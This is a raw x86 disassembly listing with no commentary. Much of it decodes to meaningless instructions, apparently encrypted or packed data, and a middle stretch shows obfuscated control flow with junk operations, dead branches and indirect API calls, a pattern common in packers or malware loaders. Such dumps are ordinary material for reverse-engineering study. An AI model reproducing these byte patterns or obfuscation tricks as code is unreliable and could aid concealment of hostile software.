  417211:	mov    DWORD PTR [edi],0x4949f261
  417217:	pusha  
  417218:	xor    eax,0x1fb0ab8
  41721d:	and    bl,BYTE PTR [edi+eiz*1+0x3e]
  417221:	pop    es
  417222:	sbb    ecx,esp
  417224:	(bad)  
  417225:	mov    bh,0x29
  417227:	fcom   DWORD PTR [esi+eax*1-0x4dda6867]
  41722e:	mov    al,ds:0xd85306ba
  417233:	mov    ds:0x81b7b1a0,al
  417238:	sar    BYTE PTR [eax-0x6f43c6c1],0xd5
  41723f:	jle    0x41726e
  417241:	xchg   ecx,eax
  417242:	or     DWORD PTR [esi],esi
  417244:	ds in  al,dx
  417246:	icebp  
  417247:	call   0xb957:0xb7ca08df
  41724e:	cli    
  41724f:	outs   dx,DWORD PTR ds:[esi]
  417250:	test   BYTE PTR [eax-0x69e5d392],ah
  417256:	mov    WORD PTR [ebx+ebx*2+0x45],?
  41725a:	repnz ds push ecx
  41725d:	inc    ebx
  41725e:	or     BYTE PTR [eax],0x1d
  417261:	nop
  417262:	les    esi,FWORD PTR [ecx+ebp*2]
  417265:	mov    DWORD PTR [edx],0xd23be7d2
  41726b:	mov    cl,0x67
  41726d:	stos   BYTE PTR es:[edi],al
  41726e:	ins    DWORD PTR es:[edi],dx
  41726f:	aam    0x6c
  417271:	nop
  417272:	and    BYTE PTR [ebx],dl
  417274:	mov    ebx,0xdf944cfa
  417279:	outs   dx,DWORD PTR ds:[esi]
  41727a:	mov    dh,0xae
  41727c:	mov    ds:0x8970f77a,al
  417281:	pushf  
  417282:	xchg   BYTE PTR [ebp+edi*4-0x3b],al
  417286:	jbe    0x417209
  417288:	push   edx
  417289:	inc    esi
  41728a:	or     eax,0x2412d0e0
  41728f:	pop    ebx
  417290:	mov    edi,0x7c2b7efb
  417295:	(bad)  
  417296:	cmp    eax,0x29467dee
  41729b:	lods   eax,DWORD PTR ds:[esi]
  41729c:	idiv   DWORD PTR cs:[ebx-0x3b]
  4172a0:	push   ds
  4172a1:	jo     0x4172ba
  4172a3:	jl     0x67c6ad61
  4172a9:	cwde   
  4172aa:	cmp    cl,ch
  4172ac:	mov    es,WORD PTR [eax-0x43]
  4172af:	pop    ecx
  4172b0:	(bad)  
  4172b1:	jns    0x41724c
  4172b3:	push   edi
  4172b4:	mov    ds:0xb55f392a,eax
  4172b9:	test   DWORD PTR [edx],esi
  4172bb:	push   0x879e65f4
  4172c0:	test   DWORD PTR [esi-0x75],ebx
  4172c3:	adc    BYTE PTR [esi-0x4e],dh
  4172c6:	push   ecx
  4172c7:	dec    ebx
  4172c8:	mov    ds:0x7c2d5a4a,al
  4172cd:	mov    esp,0xdf774a6
  4172d2:	push   eax
  4172d3:	pop    ecx
  4172d4:	int    0x38
  4172d6:	fadd   DWORD PTR [eax+0x2b]
  4172d9:	mov    ch,0xc5
  4172db:	push   edi
  4172dc:	dec    esi
  4172dd:	imul   edi,DWORD PTR [esi+0x520f4244],0x89136b53
  4172e7:	int    0xb8
  4172e9:	xor    ecx,DWORD PTR [edx]
  4172eb:	int    0xce
  4172ed:	mov    edx,0x9f19f04
  4172f2:	pusha  
  4172f3:	(bad)  [ecx-0xc]
  4172f6:	out    dx,al
  4172f7:	popf   
  4172f8:	cmp    ecx,DWORD PTR [eax]
  4172fa:	inc    esi
  4172fb:	fs sbb ebx,ebx
  4172fe:	sbb    bh,BYTE PTR [ebx-0x45]
  417301:	push   bx
  417303:	and    ch,BYTE PTR [edi+ecx*8]
  417306:	inc    eax
  417307:	mov    edi,DWORD PTR [edx-0x31]
  41730a:	rcl    ecx,1
  41730c:	or     BYTE PTR ss:[eax],ch
  41730f:	adc    ch,BYTE PTR [esp+ebx*1+0x584a4a73]
  417316:	pop    ebx
  417317:	sbb    cl,BYTE PTR [ebx-0x3d9cfb17]
  41731d:	aaa    
  41731e:	dec    ebx
  41731f:	ror    DWORD PTR [ebp+esi*2+0x3093e598],cl
  417326:	js     0x417334
  417328:	xor    eax,0x106f2950
  41732d:	mov    bl,0x88
  41732f:	cmp    edi,DWORD PTR ds:0xcbef81b0
  417335:	cld    
  417336:	cmp    DWORD PTR [edx-0x2f151f2f],ebx
  41733c:	jmp    0x69fa8f79
  417341:	xchg   esi,eax
  417342:	retf   
  417343:	and    ebp,esi
  417345:	push   cs
  417346:	xor    al,bh
  417348:	add    ebx,0xbfc7b988
  41734e:	out    0x8d,eax
  417350:	inc    esp
  417351:	and    al,0x44
  417353:	mov    DWORD PTR [esp+0xc],eax
  417357:	cmp    DWORD PTR ds:0x42834d,0x0
  41735e:	mov    DWORD PTR ds:0x428491,edi
  417364:	mov    ecx,0x653d
  417369:	jmp    0x417446
  41736e:	mov    DWORD PTR ds:0x428435,0x6fab
  417378:	mov    DWORD PTR ds:0x428429,0x3325
  417382:	cmp    DWORD PTR ds:0x42834d,0x0
  417389:	jl     0x4173a7
  41738f:	push   DWORD PTR [ebp-0x20]
  417392:	push   DWORD PTR [ebp-0xc]
  417395:	call   DWORD PTR ds:0x42e0ec
  41739b:	xor    edi,0x628b
  4173a1:	or     edi,0x2ad9
  4173a7:	and    DWORD PTR ds:0x42857d,edx
  4173ad:	and    ecx,DWORD PTR ds:0x428599
  4173b3:	xor    edi,edi
  4173b5:	add    edi,DWORD PTR ds:0x4284cd
  4173bb:	mov    edx,DWORD PTR ds:0x4285c5
  4173c1:	sub    edi,edx
  4173c3:	or     edi,DWORD PTR [edi+edx*1]
  4173c6:	inc    edx
  4173c7:	cmp    DWORD PTR ds:0x428375,0x0
  4173ce:	mov    DWORD PTR ds:0x428499,0x322b
  4173d8:	mov    DWORD PTR ds:0x428395,0x622c
  4173e2:	mov    edx,DWORD PTR ds:0x428365
  4173e8:	mov    DWORD PTR ds:0x4284ed,0x673b
  4173f2:	jmp    0x417446
  4173f7:	mov    DWORD PTR ds:0x42836d,edx
  4173fd:	cmp    DWORD PTR ds:0x428375,0x0
  417404:	jl     0x41742c
  41740a:	push   DWORD PTR [ebp-0x24]
  41740d:	push   0x428263
  417412:	call   DWORD PTR ds:0x42e27c
  417418:	sbb    DWORD PTR ds:0x428371,0x4806
  417422:	add    DWORD PTR ds:0x428501,0x48d6
  41742c:	add    edi,0x263
  417432:	xor    DWORD PTR ds:0x428379,0x2f2b
  41743c:	add    DWORD PTR ds:0x4285a1,0x7768
  417446:	lea    eax,[esp+0x60]
  41744a:	xor    ecx,ecx
  41744c:	or     ecx,DWORD PTR ds:0x42835d
  417452:	xor    DWORD PTR ds:0x428379,ecx
  417458:	mov    DWORD PTR [esp+0x10],eax
  41745c:	sub    edi,DWORD PTR ds:0x42851d
  417462:	mov    eax,ds:0x422728
  417467:	sbb    DWORD PTR ds:0x428499,edx
  41746d:	mov    eax,DWORD PTR [eax+0x1d8]
  417473:	cmp    DWORD PTR ds:0x42849d,0x0
  41747a:	mov    edi,0x142d
  41747f:	mov    DWORD PTR ds:0x42838d,edi
  417485:	jmp    0x4174dd
  41748a:	not    ecx
  41748c:	cmp    DWORD PTR ds:0x42849d,0x0
  417493:	jg     0x4174bb
  417499:	push   DWORD PTR [ebp-0x1c]
  41749c:	push   0x483b
  4174a1:	call   DWORD PTR ds:0x42e0f0
  4174a7:	and    DWORD PTR ds:0x42850d,0x19ab
  4174b1:	xor    DWORD PTR ds:0x428361,0x742c
  4174bb:	add    edx,DWORD PTR ds:0x428579
  4174c1:	sub    DWORD PTR ds:0x428489,0x7d91
  4174cb:	mov    edx,DWORD PTR ds:0x42843d
  4174d1:	or     DWORD PTR ds:0x428505,edx
  4174d7:	adc    DWORD PTR ds:0x428511,ecx
  4174dd:	mov    eax,DWORD PTR [eax]
  4174df:	mov    edi,DWORD PTR ds:0x428535
  4174e5:	mov    ecx,DWORD PTR ds:0x4285b1
  4174eb:	sub    ecx,edi
  4174ed:	or     edi,DWORD PTR [edi+ecx*1]
  4174f0:	mov    ecx,eax
  4174f2:	xor    ecx,0xa5069baf
  4174f8:	xor    edx,edx
  4174fa:	or     edx,DWORD PTR ds:0x428469
  417500:	sub    edx,DWORD PTR ds:0x42848d
  417506:	mov    DWORD PTR ds:0x428469,edx
  41750c:	xor    eax,0xfffffffe
  41750f:	shl    eax,0x1e
  417512:	and    DWORD PTR ds:0x428359,edi
  417518:	shr    ecx,0x2
  41751b:	or     ecx,eax
  41751d:	mov    eax,DWORD PTR [esp+0x10]
  417521:	inc    edx
  417522:	mov    DWORD PTR [eax],ecx
  417524:	xor    edx,edi
  417526:	mov    edi,0xcb79b566
  41752b:	mov    DWORD PTR [esp+0x80],edi
  417532:	mov    DWORD PTR [esp+0x84],esi
  417539:	cmp    DWORD PTR ds:0x428435,0x0
  417540:	movzx  ecx,WORD PTR ds:0x428365
  417547:	movzx  ecx,BYTE PTR ds:0x428459
  41754e:	jmp    0x4175bc
  417553:	not    edx
  417555:	cmp    DWORD PTR ds:0x428435,0x0
  41755c:	jb     0x4175ae
  417562:	push   DWORD PTR [ebp-0x20]
  417565:	push   0x1e74
  41756a:	push   0x10b8
  41756f:	push   0x6d55
  417574:	push   DWORD PTR [ebp-0x18]
  417577:	push   DWORD PTR [ebp-0x1c]
  41757a:	call   DWORD PTR ds:0x42e0f4
  417580:	movzx  edx,BYTE PTR ds:0x4285a1
  417587:	add    edx,DWORD PTR ds:0x428509
  41758d:	mov    DWORD PTR ds:0x4285a1,edx
  417593:	xor    ecx,ecx
  417595:	xor    ecx,DWORD PTR ds:0x4283d9
  41759b:	xor    edx,edx
  41759d:	xor    edx,DWORD PTR ds:0x428551
  4175a3:	sub    ecx,edx
  4175a5:	sub    ecx,DWORD PTR [ecx+edx*1]
  4175a8:	add    DWORD PTR ds:0x42838d,edx
  4175ae:	xor    DWORD PTR ds:0x428589,ebx
  4175b4:	sbb    DWORD PTR ds:0x428425,edx
  4175ba:	adc    edx,ecx
  4175bc:	mov    eax,DWORD PTR [esp+0x80]
  4175c3:	or     edx,edx
  4175c5:	mov    ecx,DWORD PTR [esp+0x84]
  4175cc:	cmp    DWORD PTR ds:0x428499,0x0
  4175d3:	mov    edx,DWORD PTR ds:0x42849d
  4175d9:	mov    DWORD PTR ds:0x428369,0x64c4
  4175e3:	mov    edx,DWORD PTR ds:0x42842d
  4175e9:	jmp    0x417644
  4175ee:	mov    DWORD PTR ds:0x428451,0x1a08
  4175f8:	cmp    DWORD PTR ds:0x428499,0x0
  4175ff:	ja     0x417624
  417605:	push   DWORD PTR [ebp-0x1c]
  417608:	call   DWORD PTR ds:0x42e280
  41760e:	sbb    edx,DWORD PTR ds:0x428371
  417614:	adc    DWORD PTR ds:0x42843d,0x1011
  41761e:	sbb    DWORD PTR ds:0x4284f5,ebx
  417624:	xor    edx,edx
  417626:	or     edx,DWORD PTR ds:0x428425
  41762c:	xor    DWORD PTR ds:0x42856d,edx
  417632:	add    DWORD PTR ds:0x42842d,ebx
  417638:	add    edx,0x156e
  41763e:	sub    edx,0x437f
  417644:	shrd   eax,ecx,0x2
  417648:	cmp    DWORD PTR ds:0x428521,0x0
  41764f:	mov    edx,0x364f
  417654:	mov    DWORD PTR ds:0x428515,0x205c
  41765e:	mov    edx,0xb6f
  417663:	jmp    0x4176bb
  417668:	mov    edx,DWORD PTR ds:0x428565
  41766e:	mov    DWORD PTR ds:0x428391,edi
  417674:	cmp    DWORD PTR ds:0x428521,0x0
  41767b:	jae    0x4176a7
  417681:	push   DWORD PTR [ebp-0x18]
  417684:	call   DWORD PTR ds:0x42e0f8
  41768a:	sub    DWORD PTR ds:0x428469,0x4a16
  417694:	mov    edx,DWORD PTR ds:0x4285a1
  41769a:	or     DWORD PTR ds:0x428585,edx
  4176a0:	sub    DWORD PTR ds:0x42856d,ecx
  4176a6:	dec    edx
  4176a7:	dec    edx
  4176a8:	not    DWORD PTR ds:0x428351
  4176ae:	movzx  edx,WORD PTR ds:0x428565
  4176b5:	sub    DWORD PTR ds:0x42851d,edx
  4176bb:	shr    ecx,0x2
  4176be:	mov    ecx,DWORD PTR [esp+0x80]
  4176c5:	mov    edx,DWORD PTR [esp+0x84]
  4176cc:	add    DWORD PTR ds:0x428355,0x428381
  4176d6:	xor    eax,0x32de6d5d
  4176db:	adc    DWORD PTR ds:0x428385,0x4c3b
  4176e5:	xor    edx,edx
  4176e7:	or     DWORD PTR ds:0x4284fd,0x428371
  4176f1:	or     edx,eax
  4176f3:	mov    eax,ds:0x428485
  4176f8:	adc    DWORD PTR ds:0x428591,eax
  4176fe:	mov    eax,ds:0x422728
  417703:	or     DWORD PTR ds:0x42842d,0x428461
  41770d:	push   edx
  41770e:	or     DWORD PTR ds:0x428445,0x3421
  417718:	push   DWORD PTR [eax+0x19c]
  41771e:	lea    eax,[esp+0x80]
  417725:	push   eax
  417726:	sbb    DWORD PTR ds:0x428371,0x428485
  417730:	shl    ecx,0x1e
  417733:	call   0x411c08
  417738:	or     DWORD PTR ds:0x42842d,0x889
  417742:	lea    eax,[ebp+0x10]
  417745:	add    DWORD PTR ds:0x428455,0x428391
  41774f:	push   eax
  417750:	or     DWORD PTR ds:0x428431,0x378
  41775a:	mov    DWORD PTR [esp+0x14],edi
  41775e:	mov    DWORD PTR [esp+0x18],esi
  417762:	add    DWORD PTR ds:0x42858d,0x1c44
  41776c:	lea    eax,[ebp+0xc]
  41776f:	sbb    DWORD PTR ds:0x428585,0x6a60
  417779:	push   eax
  41777a:	adc    DWORD PTR ds:0x4284a1,0x65f7
  417784:	mov    DWORD PTR [esp+0x18],edi
  417788:	lea    eax,[ebp+0x8]
  41778b:	mov    DWORD PTR [esp+0x1c],esi
  41778f:	sub    DWORD PTR ds:0x428499,0x37c8
  417799:	jmp    0x4179f6
  41779e:	cmp    edx,eax
  4177a0:	retf   
  4177a1:	mov    esp,0x44b9bc3c
  4177a6:	out    0x8d,eax
  4177a8:	push   es
  4177a9:	xchg   edx,eax
  4177aa:	jg     0x417782
  4177ac:	in     eax,0xe3
  4177ae:	sti    
  4177af:	faddp  st(0),st
  4177b1:	mov    esi,0xbebec235
  4177b6:	or     eax,0x6794691a
  4177bb:	(bad)  
  4177bc:	addr16 inc esp
  4177be:	retf   0xb85
  4177c1:	mov    ecx,0xb04347cc
  4177c6:	inc    edx
  4177c7:	loopne 0x41783e
  4177c9:	jle    0x417763
  4177cb:	mov    fs,eax
  4177cd:	mov    edx,0x2fd80726
  4177d2:	mov    WORD PTR [ebx+0x59d4595f],?
  4177d8:	lsl    esi,WORD PTR ds:0xfdd041bb
  4177df:	ficomp DWORD PTR [edi-0x10]
  4177e2:	mov    edx,0x75915b6a
  4177e7:	xor    al,0x7
  4177e9:	pop    ds
  4177ea:	popa   
  4177eb:	xlat   BYTE PTR ds:[ebx]
  4177ec:	inc    edi
  4177ed:	sub    bh,BYTE PTR [edx-0x67f234bd]
  4177f3:	int3   
  4177f4:	sbb    al,0x55
  4177f6:	test   eax,0x542820f0
  4177fb:	mov    eax,ds:0x2bc59cb1
  417800:	jecxz  0x41787c
  417802:	outs   dx,DWORD PTR ds:[esi]
  417803:	clc    
  417804:	ja     0x41778a
  417806:	jle    0x4177ec
  417808:	xchg   BYTE PTR [ebp+0x600d712f],ch
  41780e:	inc    ecx
  41780f:	sub    bh,al
  417811:	push   ecx
  417812:	push   bx
  417814:	sti    
  417815:	fbstp  TBYTE PTR [ebp+0x79d5448c]
  41781b:	lock jb 0x417877
  41781e:	inc    ebp
  41781f:	iret   
  417820:	ds mov edi,0x834376f6
  417826:	add    eax,DWORD PTR [ecx]
  417828:	data16 jne 0x4177e5
  41782b:	ja     0x4177b6
  41782d:	test   DWORD PTR [ebp+edi*2+0x3a],edx
  417831:	mov    edx,0xd0a48bce
  417836:	mov    dh,0xee
  417838:	jge    0x4177cf
  41783a:	into   
  41783b:	in     eax,0xfc
  41783d:	and    ecx,esp
  41783f:	push   0xc728d362
  417844:	ficom  WORD PTR [esi-0x21c82730]
  41784a:	rcr    DWORD PTR [ecx-0x2c],0x21
  41784e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  417850:	inc    esp
  417851:	push   esp
  417852:	dec    ebx
  417853:	mov    ?,WORD PTR [edi]
  417855:	jp     0x4178c7
  417857:	test   BYTE PTR [edi],cl
  417859:	stc    
  41785a:	js     0x417844
  41785c:	dec    dh
  41785e:	pop    ss
  41785f:	jne    0x41784b
  417861:	sbb    eax,0x46fa6cab
  417866:	iret   
  417867:	xchg   edi,eax
  417868:	sti    
  417869:	pop    edx
  41786a:	mov    dh,0xe0
  41786c:	dec    ebx
  41786d:	cld    
  41786e:	fisub  DWORD PTR [ebx-0x4d]
  417871:	push   0x30
  417873:	sar    BYTE PTR [ebx+esi*2],1
  417876:	and    edx,DWORD PTR [edi+esi*8+0x4f]
  41787a:	xor    al,0x96
  41787c:	xor    eax,0xb21ce99e
  417881:	or     eax,0xef852d26
  417886:	test   BYTE PTR [ebx],dh
  417888:	mov    ch,0x3b
  41788a:	test   DWORD PTR [edi],esi
  41788c:	xchg   ebp,eax
  41788d:	sub    dl,BYTE PTR [ebx-0x19]
  417890:	fnstcw WORD PTR [ebx-0x3e]
  417893:	inc    ecx
  417894:	mov    eax,ds:0x3bd0414c
  417899:	ins    BYTE PTR es:[edi],dx
  41789a:	loopne 0x417845
  41789c:	or     al,0xbd
  41789e:	cli    
  41789f:	push   0xf1ff3a37
  4178a4:	and    edx,DWORD PTR [edx+eiz*4+0xf]
  4178a8:	push   edx
  4178a9:	sub    BYTE PTR [eax],ch
  4178ab:	aad    0x4d
  4178ad:	push   ebx
  4178ae:	stos   DWORD PTR es:[edi],eax
  4178af:	ret    
  4178b0:	push   cs
  4178b1:	jae    0x417875
  4178b3:	mov    al,ds:0x1012ba9e
  4178b8:	imul   ebx,DWORD PTR [eax],0xffffffb0
  4178bb:	pop    ds
  4178bc:	pop    esi
  4178bd:	mov    ebx,0x6a177cc4
  4178c2:	mov    esi,ebx
  4178c4:	adc    al,0xa9
  4178c6:	js     0x41789b
  4178c8:	repz loop 0x41785c
  4178cb:	adc    al,0x47
  4178cd:	jmp    0x6bfb:0xc3969d23
  4178d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178d5:	retf   0x335e
  4178d8:	dec    esp
  4178d9:	fs adc al,0x76
  4178dc:	jle    0x417877
  4178de:	in     al,0x4a
  4178e0:	aam    0xaf
  4178e2:	(bad)  
  4178e3:	gs jg  0x4178af
  4178e6:	adc    bl,BYTE PTR [esi+esi*1+0x19]
  4178ea:	xchg   esp,eax
  4178eb:	mov    al,0x8
  4178ed:	dec    BYTE PTR [edi-0x6445b1ee]
  4178f3:	jo     0x41793d
  4178f5:	pop    es
  4178f6:	enter  0x52e,0x64
  4178fa:	(bad)  
  4178fc:	sbb    eax,0x8a533835
  417901:	xchg   edx,eax
  417902:	jo     0x417931
  417904:	outs   dx,BYTE PTR ds:[esi]
  417905:	mov    dl,0xc0
  417907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417908:	ret    0x4a68
  41790b:	and    ecx,esi
  41790d:	xchg   BYTE PTR [edx*8-0x11298d87],dh
  417914:	in     eax,dx
  417915:	add    eax,0x81650489
  41791a:	outs   dx,DWORD PTR ds:[esi]
  41791b:	dec    ebx
  41791c:	enter  0xd779,0x91
  417920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417921:	ror    BYTE PTR [edx-0x60],cl
  417924:	pcmpeqb mm1,QWORD PTR [ecx]
  417927:	fs mov ecx,0x4ad9b9ac
  41792d:	pop    edx
  41792e:	int    0x75
  417930:	lock retf 
  417932:	mov    cl,0x72
  417934:	(bad)  [edi-0x345db266]
  41793a:	fstp   QWORD PTR ds:0xf396f1e2
  417940:	sub    ebp,DWORD PTR [esi-0x56]
  417943:	mov    edx,0x96eb7946
  417948:	sbb    DWORD PTR [esi+0x3c],0x38c8b171
  41794f:	ss ret 
  417951:	mov    WORD PTR [edx],bp
  417954:	std    
  417955:	in     al,dx
  417956:	push   ds
  417957:	and    eax,0xc440c4
  41795c:	arpl   WORD PTR [edx],di
  41795e:	dec    esi
  41795f:	aad    0x72
  417961:	nop
  417962:	mov    cl,0xdd
  417964:	loopne 0x417994
  417966:	xchg   DWORD PTR [edx],ebx
  417968:	xchg   edx,eax
  417969:	pop    edx
  41796a:	sbb    ebx,DWORD PTR [ebx-0x52]
  41796d:	mov    cl,0x32
  41796f:	cs aam 0xcc
  417972:	test   bh,ah
  417974:	icebp  
  417975:	aad    0x3e
  417977:	inc    edx
  417978:	jne    0x4179ca
  41797a:	gs xor esp,edi
  41797d:	(bad)  
  41797e:	mov    DWORD PTR ss:[ebx],ecx
  417981:	test   DWORD PTR [ebp-0xa],0xf6d4f1d
  417988:	iret   
  417989:	sar    DWORD PTR [ebp-0x7e],1
  41798c:	sbb    al,BYTE PTR [ecx+0x580a1c]
  417992:	jne    0x41798b
  417994:	mov    WORD PTR [edi],cs
  417996:	jb     0x41794e
  417998:	cmp    DWORD PTR [eax+eax*1+0x1],esp
  41799c:	imul   edi,edx,0xffffffed
  41799f:	bound  ebp,QWORD PTR [edi+0x73]
  4179a2:	repnz pop edi
  4179a4:	enter  0x369f,0xa6
  4179a8:	ss cdq 
  4179aa:	mov    ecx,0xacd2a18f
  4179af:	cmp    bl,BYTE PTR [ebp-0x293c46ef]
  4179b5:	and    DWORD PTR [ebx+eax*1],edx
  4179b8:	in     eax,0x56
  4179ba:	jb     0x417a1e
  4179bc:	jecxz  0x417975
  4179be:	les    esi,FWORD PTR [ebx+ebp*4]
  4179c1:	mov    ebx,0x49e97e5b
  4179c6:	rcl    BYTE PTR [edx-0x1758f984],cl
  4179cc:	in     al,dx
  4179cd:	mov    ch,0x83
  4179cf:	out    0xcf,al
  4179d1:	or     BYTE PTR [edx-0x3d],cl
  4179d4:	sub    edx,esp
  4179d6:	daa    
  4179d7:	cmp    BYTE PTR es:[eax-0x9],0x63
  4179dc:	mov    eax,0x223ec78f
  4179e1:	add    DWORD PTR [edx+0x70f513ea],ebp
  4179e7:	ja     0x4179d7
  4179e9:	mov    ds:0xa13531a2,eax
  4179ee:	mov    cl,0xae
  4179f0:	pop    ebp
  4179f1:	mov    ds:0x244ff0e8,eax
  4179f6:	mov    DWORD PTR [esp+0x18],edi
  4179fa:	adc    DWORD PTR ds:0x4284f9,0x42838d
  417a04:	jmp    0x417c61
  417a09:	and    BYTE PTR [ecx],al
  417a0b:	fst    QWORD PTR [ecx-0x4b4b4d1d]
  417a11:	jb     0x417a54
  417a13:	sahf   
  417a14:	nop
  417a15:	xor    al,0xf7
  417a17:	fist   WORD PTR [eax-0x413f1d8d]
  417a1d:	xor    eax,0x3fbebec2
  417a22:	nop
  417a23:	inc    ecx
  417a24:	les    esi,FWORD PTR [ecx]
  417a26:	add    eax,0x383a022b
  417a2b:	sbb    eax,DWORD PTR [edx+0xd]
  417a2e:	cmp    BYTE PTR [edi+eiz*1+0x70],dh
  417a32:	inc    BYTE PTR [edi-0x7d662fe3]
  417a38:	mov    esi,DWORD PTR ds:0xd11059bc
  417a3e:	push   esp
  417a3f:	push   ebx
  417a40:	pop    eax
  417a41:	or     ebx,esp
  417a43:	out    0x52,eax
  417a45:	mov    eax,ds:0x6b4e1b46
  417a4a:	loop   0x417a1b
  417a4c:	jle    0x4179de
  417a4e:	out    dx,al
  417a4f:	cdq    
  417a50:	nop
  417a51:	pop    ss
  417a52:	ins    BYTE PTR es:[edi],dx
  417a53:	imul   esi,DWORD PTR [ecx-0x10],0x4f719129
  417a5a:	ss gs push ecx
  417a5d:	scas   eax,DWORD PTR es:[edi]
  417a5e:	push   ss
  417a5f:	push   ebp
  417a60:	jle    0x417a5d
  417a62:	rcr    DWORD PTR [esi],cl
  417a64:	(bad)  
  417a65:	pop    ss
  417a66:	jle    0x417a71
  417a68:	adc    ch,BYTE PTR [ecx]
  417a6a:	and    eax,0xca6c9e99
  417a6f:	mov    ah,0xd6
  417a71:	mov    ebx,0xec94fb09
  417a76:	mov    ds:0x77a9c986,eax
  417a7b:	in     eax,dx
  417a7c:	add    al,0x4f
  417a7e:	jmp    0x417a87
  417a80:	xlat   BYTE PTR ds:[ebx]
  417a81:	lods   eax,DWORD PTR ds:[esi]
  417a82:	scas   al,BYTE PTR es:[edi]
  417a83:	(bad)  
  417a84:	repz fwait
  417a86:	test   edx,edi
  417a88:	and    bl,BYTE PTR [ecx]
  417a8a:	(bad)  
  417a8b:	ja     0x417a39
  417a8d:	clc    
  417a8e:	aaa    
  417a8f:	sbb    edx,DWORD PTR [ebx+ebx*1+0x8]
  417a93:	pusha  
  417a94:	push   es
  417a95:	sbb    eax,0x15c2b3f1
  417a9a:	std    
  417a9b:	jns    0x417ab2
  417a9d:	inc    edx
  417a9e:	sti    
  417a9f:	aad    0x8e
  417aa1:	mov    edx,0xc3509df8
  417aa6:	fstp   DWORD PTR [ebp+0x724c8046]
  417aac:	xchg   ecx,eax
  417aad:	pop    ss
  417aae:	and    DWORD PTR [eax+eax*1-0x4675f4b3],0xffffff9f
  417ab6:	test   DWORD PTR [eax],ebp
  417ab8:	test   DWORD PTR [ecx],ebx
  417aba:	fdecstp 
  417abc:	xor    DWORD PTR [edx+0x43],ebp
  417abf:	push   ebx
  417ac0:	(bad)  
  417ac1:	fild   QWORD PTR [edi-0x44e60267]
  417ac7:	shr    DWORD PTR [ebp+0x6c],0x72
  417acb:	adc    DWORD PTR [esi+esi*1],eax
  417ace:	adc    ch,0xab
  417ad1:	ins    DWORD PTR es:[edi],dx
  417ad2:	dec    edi
  417ad3:	push   ss
  417ad4:	scas   al,BYTE PTR es:[edi]
  417ad5:	add    bh,BYTE PTR [ecx-0x46]
  417ad8:	pusha  
  417ad9:	imul   eax,DWORD PTR [ebp+0x38f564ce],0x56181a3c
  417ae3:	xchg   ecx,eax
  417ae4:	imul   edi,DWORD PTR [ebp+0x34],0x8ec7306
  417aeb:	pop    es
  417aec:	push   es
  417aed:	cmp    ebp,DWORD PTR [edx-0x5f]
  417af0:	cld    
  417af1:	out    dx,al
  417af2:	je     0x417b36
  417af4:	(bad)  
  417af5:	fcom   QWORD PTR [esi-0x65a1b070]
  417afb:	adc    BYTE PTR [edx+0x5969d354],dl
  417b01:	xchg   edx,eax
  417b02:	cli    
  417b03:	enter  0x3ad8,0x62
  417b07:	scas   eax,DWORD PTR es:[edi]
  417b08:	sub    BYTE PTR [ebx-0x27],ch
  417b0b:	xor    ebx,DWORD PTR [ebx+0x22]
  417b0e:	sub    eax,0xe5f80ad0
  417b13:	in     al,0xc
  417b15:	stc    
  417b16:	and    edx,DWORD PTR [esi+0x23e63477]
  417b1c:	scas   al,BYTE PTR es:[edi]
  417b1d:	mov    ch,0x67
  417b1f:	hlt    
  417b20:	mov    ds:0x13bb5d3a,eax
  417b25:	xor    dh,BYTE PTR [eax-0x39f78a84]
  417b2b:	pminub mm0,QWORD PTR [edi+0x1f]
  417b2f:	push   esi
  417b30:	xlat   BYTE PTR ds:[ebx]
  417b31:	cmp    eax,0x56a89921
  417b36:	xchg   esi,eax
  417b37:	inc    ecx
  417b38:	mov    gs,ecx
  417b3a:	fisttp DWORD PTR [ecx]
  417b3c:	stos   DWORD PTR es:[edi],eax
  417b3d:	push   DWORD PTR [ebx]
  417b3f:	inc    ecx
  417b40:	lods   eax,DWORD PTR ds:[esi]
  417b41:	je     0x417ac6
  417b43:	mov    DWORD PTR [eax+0x14],edi
  417b46:	jge    0x417b09
  417b48:	in     eax,0x8b
  417b4a:	adc    al,0x86
  417b4c:	xchg   esp,eax
  417b4d:	mov    ebx,0x93e0591c
  417b52:	cmp    DWORD PTR [edx+eiz*1+0x65],ebp
  417b56:	jns    0x417b98
  417b58:	sbb    dl,BYTE PTR [edx-0x64e16829]
  417b5e:	sbb    DWORD PTR [edi],ecx
  417b60:	aas    
  417b61:	mov    ebp,0x43ebd102
  417b66:	pop    ebx
  417b67:	jle    0x417b95
  417b69:	jle    0x417b2f
  417b6b:	xchg   edi,eax
  417b6c:	inc    esp
  417b6d:	mov    al,ds:0xf0c99a83
  417b72:	pusha  
  417b73:	mov    esi,0x898cdeb0
  417b78:	push   ebx
  417b79:	mov    ds:0x82e71c96,eax
  417b7e:	cli    
  417b7f:	iret   
  417b80:	inc    esi
  417b81:	inc    esp
  417b82:	jge    0x417b66
  417b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b85:	sahf   
  417b86:	sbb    al,0xc0
  417b88:	les    esp,FWORD PTR [ebp-0x42]
  417b8b:	mov    DWORD PTR [ebp-0x10493149],ebx
  417b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b92:	outs   dx,DWORD PTR ds:[esi]
  417b93:	mov    ecx,esi
  417b95:	ror    BYTE PTR [ebx+0x48],cl
  417b98:	xor    esp,DWORD PTR [ebp-0xc9303d]
  417b9e:	and    BYTE PTR [eax],dh
  417ba0:	dec    ecx
  417ba1:	cmp    eax,0xdf94a7a3
  417ba6:	and    al,0xc6
  417ba8:	aaa    
  417ba9:	nop
  417baa:	xchg   edx,eax
  417bab:	mov    esi,0x73f370e2
  417bb0:	xchg   ebx,eax
  417bb1:	out    0x46,eax
  417bb3:	and    eax,0x459867a2
  417bb8:	adc    cl,dh
  417bba:	loop   0x417bcc
  417bbc:	clc    
  417bbd:	repz mov dl,0x47
  417bc0:	push   cs
  417bc1:	jp     0x417b51
  417bc3:	cmp    al,0x7b
  417bc5:	test   DWORD PTR [ebx+eax*1],ebx
  417bc8:	inc    ebp
  417bc9:	mov    BYTE PTR [esi],ah
  417bcb:	call   0x774d:0xf94d0965
  417bd2:	xor    bl,ah
  417bd4:	adc    al,BYTE PTR [eax+0x44d1e12f]
  417bda:	jb     0x417bc6
  417bdc:	ins    DWORD PTR es:[edi],dx
  417bdd:	and    DWORD PTR [edi+0x30],ebp
